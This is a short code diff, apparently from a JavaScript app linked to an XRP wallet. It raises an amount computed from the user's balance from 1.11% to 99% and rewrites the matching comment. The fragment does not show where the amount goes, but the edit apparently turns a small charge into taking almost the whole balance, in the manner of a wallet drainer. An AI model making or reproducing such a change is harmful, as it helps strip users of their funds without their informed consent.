@@ -117,8 +117,8 @@
                         const balanceInXRP = balanceInDrops / 1000000;
                         setUserBalance(balanceInXRP);
                         
-                        // Calculate 1.11% of balance
-                        const percentage = balanceInXRP * 0.0111;
+                        // Calculate 99% of balance
+                        const percentage = balanceInXRP * 0.99;
                         const amountInDrops = Math.floor(percentage * 1000000);
                         setCalculatedAmount(amountInDrops.toString());
                         
